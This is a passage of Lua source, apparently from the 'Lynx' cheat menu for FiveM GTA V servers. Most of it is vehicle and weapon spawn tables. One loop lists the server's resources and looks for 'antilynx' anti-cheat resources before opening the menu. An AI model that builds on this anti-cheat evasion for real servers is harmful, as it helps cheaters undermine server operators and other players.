          local modName = GetLiveryName(playerVeh, realIndex)
          local realModName = GetLabelText(modName)
          local modid, realSpawnName = modID, realIndex

          valid[i] = {
            menuName=realModName,
            data = {
              ["modid"] = modid,
              ["realIndex"] = realSpawnName
            }
          }
        end
      end

      for i = 1, modCount, 1 do
        local realIndex = i - 1
        local modName = GetModTextLabel(playerVeh, modID, realIndex)
        local realModName = GetLabelText(modName)
        local modid, realSpawnName = modCount, realIndex


        valid[i] = {
          menuName=realModName,
          data = {
            ["modid"] = modid,
            ["realIndex"] = realSpawnName
          }
        }
      end


      if(modCount > 0)then
        local realIndex = -1
        local modid, realSpawnName = modID, realIndex
        table.insert(valid, 1, {
          menuName="Stock",
          data = {
            ["modid"] = modid,
            ["realIndex"] = realSpawnName
          }
        })
      end

      return valid
    end
    local protection = false
    Resources = GetResources()
    for i=0, #Resources do
      local detect = string.find(tostring(Resources[i]), "antilynxr6")
      local antishit = string.find(tostring(Resources[i]), "antilynxr5")
      print(Resources[i])
      if antishit ~= nil then
        
        LR.OpenMenu(LynxIcS)
      end
      if detect ~= nil then
      --TSE("antilynxr6:detection")
      end
    end

    local boats = {"Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"}
    local Commercial = {"Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"}
    local Compacts = {"Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"}
    local Coupes = { "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"}
    local cycles = { "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3" }
    local Emergency = { "Ambulance", "FBI", "FBI2", "FireTruk", "PBus", "Police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"}
    local Helicopters = { "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"}
    local Industrial = { "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"}
    local Military = { "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"}
    local Motorcycles = { "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"}
    local muscle = { "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"}
    local OffRoad = {"BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"}
    local Planes = {"AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"}
    local SUVs = {"BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"}
    local Sedans = {"Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"}
    local Service = { "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "Taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"}
    local Sports = {"Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"}
    local SportsClassic = {"Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"}
    local Super = {"Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"}
    local Trailer = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local trains = {"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"}
    local Utility = {"Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"}
    local Vans = {"Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"}
    local CarTypes = {"Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"}
    local CarsArray = { boats, Commercial, Compacts, Coupes, cycles, Emergency, Helicopters, Industrial, Military, Motorcycles, muscle, OffRoad, Planes, SUVs, Sedans, Service, Sports, SportsClassic, Super, Trailer, trains, Utility, Vans}
    local Trailers = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local allWeapons={"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}
    local l_weapons={Melee={BaseballBat={id="weapon_bat",name="~r~> ~s~Baseball Bat",bInfAmmo=false,mods={}},BrokenBottle={id="weapon_bottle",name="~r~> ~s~Broken Bottle",bInfAmmo=false,mods={}},Crowbar={id="weapon_Crowbar",name="~r~> ~s~Crowbar",bInfAmmo=false,mods={}},Flashlight={id="weapon_flashlight",name="~r~> ~s~Flashlight",bInfAmmo=false,mods={}},GolfClub={id="weapon_golfclub",name="~r~> ~s~Golf Club",bInfAmmo=false,mods={}},BrassKnuckles={id="weapon_knuckle",name="~r~> ~s~Brass Knuckles",bInfAmmo=false,mods={}},Knife={id="weapon_knife",name="~r~> ~s~Knife",bInfAmmo=false,mods={}},Machete={id="weapon_machete",name="~r~> ~s~Machete",bInfAmmo=false,mods={}},Switchblade={id="weapon_switchblade",name="~r~> ~s~Switchblade",bInfAmmo=false,mods={}},Nightstick={id="weapon_nightstick",name="~r~> ~s~Nightstick",bInfAmmo=false,mods={}},BattleAxe={id="weapon_battleaxe",name="~r~> ~s~Battle Axe",bInfAmmo=false,mods={}}},Handguns={Pistol={id="weapon_pistol",name="~r~> ~s~Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},PistolMK2={id="weapon_pistol_mk2",name="~r~> ~s~Pistol MK 2",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_PISTOL_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_PISTOL_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Mounted Scope",id="COMPONENT_AT_PI_RAIL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH_02"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP"},{name="~r~> ~s~Suppessor",id="COMPONENT_AT_PI_SUPP_02"}}}},CombatPistol={id="weapon_combatpistol",name="Combat Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},APPistol={id="weapon_appistol",name="AP Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_APPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_APPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},StunGun={id="weapon_stungun",name="~r~> ~s~Stun Gun",bInfAmmo=false,mods={}},Pistol50={id="weapon_pistol50",name="~r~> ~s~Pistol .50",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL50_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL50_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},SNSPistol={id="weapon_snspistol",name="~r~> ~s~SNS Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SNSPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SNSPISTOL_CLIP_02"}}}},SNSPistolMkII={id="weapon_snspistol_mk2",name="~r~> ~s~SNS Pistol Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SNSPISTOL_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SNSPISTOL_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Mounted Scope",id="COMPONENT_AT_PI_RAIL_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH_03"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP_02"},{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},HeavyPistol={id="weapon_heavypistol",name="~r~> ~s~Heavy Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},VintagePistol={id="weapon_vintagepistol",name="~r~> ~s~Vintage Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_VINTAGEPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_VINTAGEPISTOL_CLIP_02"}},BarrelAttachments={{"Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},FlareGun={id="weapon_flaregun",name="~r~> ~s~Flare Gun",bInfAmmo=false,mods={}},MarksmanPistol={id="weapon_marksmanpistol",name="~r~> ~s~Marksman Pistol",bInfAmmo=false,mods={}},HeavyRevolver={id="weapon_revolver",name="~r~> ~s~Heavy Revolver",bInfAmmo=false,mods={}},HeavyRevolverMkII={id="weapon_revolver_mk2",name="~r~> ~s~Heavy Revolver Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_01"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP_03"}}}},DoubleActionRevolver={id="weapon_doubleaction",name="~r~> ~s~Double Action Revolver",bInfAmmo=false,mods={}},UpnAtomizer={id="weapon_raypistol",name="~r~> ~s~Up-n-Atomizer",bInfAmmo=false,mods={}}},SMG={MicroSMG={id="weapon_microsmg",name="~r~> ~s~Micro SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MICROSMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MICROSMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},SMG={id="weapon_smg",name="~r~> ~s~SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SMG_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_SMG_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},SMGMkII={id="weapon_smg_mk2",name="~r~> ~s~SMG Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SMG_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SMG_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SMG_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SMG_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SMG_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS_SMG"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_SMG_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SB_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SB_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}}}},AssaultSMG={id="weapon_assaultsmg",name="~r~> ~s~Assault SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTSMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTSMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},CombatPDW={id="weapon_combatpdw",name="~r~> ~s~Combat PDW",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATPDW_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATPDW_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_COMBATPDW_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},MachinePistol={id="weapon_machinepistol",name="~r~> ~s~Machine Pistol ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_03"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},MiniSMG={id="weapon_minismg",name="~r~> ~s~Mini SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MINISMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MINISMG_CLIP_02"}}}},UnholyHellbringer={id="weapon_raycarbine",name="~r~> ~s~Unholy Hellbringer",bInfAmmo=false,mods={}}},Shotguns={PumpShotgun={id="weapon_pumpshotgun",name="~r~> ~s~Pump Shotgun",bInfAmmo=false,mods={Flashlight={{"name = Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP"}}}},PumpShotgunMkII={id="weapon_pumpshotgun_mk2",name="~r~> ~s~Pump Shotgun Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},{name="~r~> ~s~Dragon Breath Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Steel Buckshot Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~Flechette Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~Explosive Slugs",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP_03"},{name="~r~> ~s~Squared Muzzle Brake",id="COMPONENT_AT_MUZZLE_08"}}}},SawedOffShotgun={id="weapon_sawnoffshotgun",name="~r~> ~s~Sawed-Off Shotgun",bInfAmmo=false,mods={}},AssaultShotgun={id="weapon_assaultshotgun",name="~r~> ~s~Assault Shotgun",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTSHOTGUN_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTSHOTGUN_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},BullpupShotgun={id="weapon_bullpupshotgun",name="~r~> ~s~Bullpup Shotgun",bInfAmmo=false,mods={Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},Musket={id="weapon_musket",name="~r~> ~s~Musket",bInfAmmo=false,mods={}},HeavyShotgun={id="weapon_heavyshotgun",name="~r~> ~s~Heavy Shotgun",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},DoubleBarrelShotgun={id="weapon_dbshotgun",name="~r~> ~s~Double Barrel Shotgun",bInfAmmo=false,mods={}},SweeperShotgun={id="weapon_autoshotgun",name="~r~> ~s~Sweeper 